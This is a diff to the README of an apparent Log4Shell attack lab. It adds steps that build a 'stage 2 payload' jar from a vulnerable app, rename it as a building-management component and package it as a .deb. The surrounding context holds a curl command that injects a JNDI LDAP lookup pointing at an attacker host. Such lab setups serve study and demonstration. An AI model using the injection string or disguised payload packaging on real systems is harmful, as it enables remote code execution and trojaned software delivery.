@@ -71,9 +71,32 @@ curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:
 
 ## Victim
 
+### Build Java stage 2 payload
+
+> Note: Requires gradle java builder
+
+```bash
+cd victim/log4shell-vulnerable-app; gradle bootJar --no-daemon
+cp build/libs/*.jar ../buildingmgmt.1.0-2/building-management.jar
+```
+
 ### Build .deb package
 
 ```bash
+# Use docker to build so you don't need to install debian build tools locally
+git clone https://github.com/tsaarni/docker-deb-builder.git
+
+# Build the build cotnainer
+cd docker-deb-builder
+docker build -t docker-deb-builder:20.04 -f Dockerfile-ubuntu-20.04 .
+
+# create the output dir for the .deb pkg
+mkdir output
+
+# Build
+./build -i docker-deb-builder:20.04 -o output <path to debian source>
+
+
 cd victim
 make build
 
